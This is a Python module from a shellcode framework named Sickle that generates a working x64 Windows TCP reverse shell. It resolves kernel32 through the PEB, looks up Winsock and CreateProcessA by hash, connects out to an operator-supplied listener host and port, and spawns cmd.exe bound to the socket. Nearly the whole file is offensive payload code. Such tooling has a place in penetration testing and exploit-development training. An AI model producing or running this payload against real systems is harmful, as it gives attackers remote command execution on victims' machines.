import sys
import ctypes
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    ws2def,
    winternl,
    winsock2,
    processthreadsapi
)

# TODO: Make register saving optional, switch between shell envs (powershell, cmd.exe)
# SHELL ENV CHANGE: NOT DONE

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["Morten Schenk",
              "Alexandru Uifalvi",
              "Matteo Memelli",
              "wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)",
                        "Windows 11 (10.0.26100 N/A Build 26100)"]

    summary = ("Reverse Shell via TCP over IPv4 that provides an interactive cmd.exe "
               "session")

    description = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe"
    " session. Since this payload is not staged, there is no need for anything"
    " more than a Netcat listener.")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["SHELL"] = {}
    arguments["SHELL"]["optional"] = "yes"
    arguments["SHELL"]["description"] = "Shell environment"

    advanced = {}
    advanced["OP_AS_FUNC"] = {}
    advanced["OP_AS_FUNC"]["optional"] = "yes"
    advanced["OP_AS_FUNC"]["description"] = "Generate shellcode that operates as function"

    advanced["EXITFUNC"] = {}
    advanced["EXITFUNC"]["optional"] = "yes"
    advanced["EXITFUNC"]["description"] = "Exit technique"

    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
                                        "thread": "Exit as a thread",
                                        "process": "Exit as a process" }

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "wsaData"              : 0x00,
            "name"                 : 0x00,
            "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
            "lpCommandLine"        : self.shell_env_len,
            "lpProcessInformation" : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Sets the shell environment that will be returned upon execution of shellcode.
        This function will return the size of the buffer used by the shell environment.
        """
        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
        if (argv_dict == None):
            exit(-1)

        # Set the shell environment that will be used by the shellcode
        if "SHELL" not in argv_dict.keys():
            self.shell = "cmd.exe"
        else:
            self.shell = argv_dict["SHELL"]

        # Be sure to NULL terminate the shell environment used
        self.shell = "\x00"
        while (len(self.shell) % 8) != 0:
            self.shell += "\x00"

        # Document the size of the shell environment
        self.shell_env_len = len(self.shell)

        # Extract the LHOST & LPORT
        if "LPORT" not in argv_dict.keys():
            self.lport = 4444
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        # Set the EXITFUNC
        if "EXITFUNC" not in argv_dict.keys():
            self.exit_func = ""
        else:
            self.exit_func = argv_dict["EXITFUNC"]

        # Update the necessary dependencies
        if self.exit_func == "thread":
            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
        elif self.exit_func == "process":
            self.dependencies["Kernel32.dll"] += "ExitProcess",
        else:
            self.dependencies["Kernel32.dll"] += "TerminateProcess",

        # Change the shellcode operation based on how execution will be performed
        if "OP_AS_FUNC" not in argv_dict.keys():
            self.op_as_func = False
        else:
            if argv_dict["OP_AS_FUNC"].lower() == "false":
                self.op_as_func = False
            else:
                self.op_as_func = True

        return 0

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""getKernel32:
    push rbp
    mov rbp, rsp
    mov dl, 0x4b
getPEB:
    mov rcx, 0x60
    mov r8, gs:[rcx]
getHeadEntry:
    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    xor rcx, rcx
    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
found:
    leave
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    push rbp
    mov rbp, rsp
    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add r8, rdi
    mov eax, [r8 + rax * 4]
    add rax, rdi
error:
    leave
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = convert.from_str_to_xwords(lib)
        write_index = self.storage_offsets['functionName']

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['functionName']}]
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov rdi, rax
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    mov rdx, {convert.from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [rbp - {self.storage_offsets[imports[func]]}], rax
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
        sin_port = struct.pack('<H', self.lport).hex()
        sin_family = struct.pack('>H', ws2def.AF_INET).hex()

        shellcode = stubhub.get_win_prologue(self.op_as_func, self.stack_space)

#        shellcode = """
#_start:
#"""
#        if self.op_as_func == True:
#            shellcode += """
#    push rbp
#    mov rbp, rsp
#            """
#        
#        shellcode += f"""
#    sub rsp, {self.stack_space}
#"""
#
#        if self.op_as_func == False:
#            shellcode += """
#    and rsp, 0xfffffffffffffff0
#            """
#
        shellcode += """
    call getKernel32
    mov rdi, rax
"""

        shellcode += self.resolve_functions()

        shellcode += f"""
; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
    call rax

; RAX => WSASocketA([in] int                 af,              // RCX      => 0x02 (AF_INET)
;                   [in] int                 type,            // RDX      => 0x01 (SOCK_STREAM)
;                   [in] int                 protocol,        // R8       => 0x08 (IPPROTO_TCP)
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
;                   [in] GROUP               g,               // RSP+0x20 => NULL
;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
call_WSASocketA:
    mov ecx, {ws2def.AF_INET}
    mov edx, {winsock2.SOCK_STREAM}
    mov r8, {ws2def.IPPROTO_TCP}
    xor r9, r9
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
    call rax

    mov rsi, rax // save the socket file descriptor (sockfd)

; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
;                [in] int namelen);         // R8  => 0x10
call_connect:
    mov rcx, rax
    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
    lea rdx, [rbp - {self.storage_offsets['name']}]
    mov r9, {sin_addr}{sin_port}{sin_family}
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x8], r9
    mov rax, [rbp - {self.storage_offsets['connect']}]
    call rax

; [RBX] => typedef struct _STARTUPINFOA {{ }}
memset_STARTUPINFOA:
    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
    mov rbx, rdi
    xor eax, eax
    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}
    rep stosd

init_STARTUPINFOA:
    mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    mov [rbx], eax

    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
    mov [rbx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], rsi
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi

; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => NULL
;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
call_CreateProccessA:
    xor ecx, ecx
    mov rdx, rbp
    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]
    xor rax, rax
    mov eax, 0x646d63
    mov [rdx], rax
    xor r8, r8
    xor r9, r9
    xor eax, eax
    inc eax
    mov [rsp + 0x20], rax
    dec eax
    mov [rsp + 0x28], rax
    mov [rsp + 0x30], rax
    mov [rsp + 0x38], rax
    mov [rsp + 0x40], rbx
    lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
    mov [rsp + 0x48], rbx
    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
    call rax

"""

#        if self.exit_func == "thread":
#            shellcode += f"""
#; RAX => RtlExitUserThread([in] DWORD dwExitCode); // RCX => 0
#call_RtlExitUserThread:
#    xor rcx, rcx
#    mov rax, [rbp - {self.storage_offsets['RtlExitUserThread']}]
#    call rax
#            """
#        elif self.exit_func == "process":
#            shellcode += f"""
#; RAX => ExitProcess([in] UINT uExitCode); // RCX => 0
#call_ExitProcess:
#    xor rcx, rcx
#    mov rax, [rbp - {self.storage_offsets['ExitProcess']}]
#    call rax
#            """
#        elif self.exit_func == "terminate":
#            shellcode += f"""
#; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
#;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
#call_TerminateProcess:
#	xor rcx, rcx
#	dec rcx
#	xor rdx, rdx
#	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
#	call rax
#            """
#
#        if self.op_as_func == True:
#            shellcode += """
#fin:
#    leave
#    ret
#            """

        shellcode += stubhub.get_win_epilogue(self.op_as_func,
                                              self.exit_func,
                                              self.storage_offsets)

        shellcode += self.get_kernel32()

        shellcode += self.lookup_function()

        print(shellcode)

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
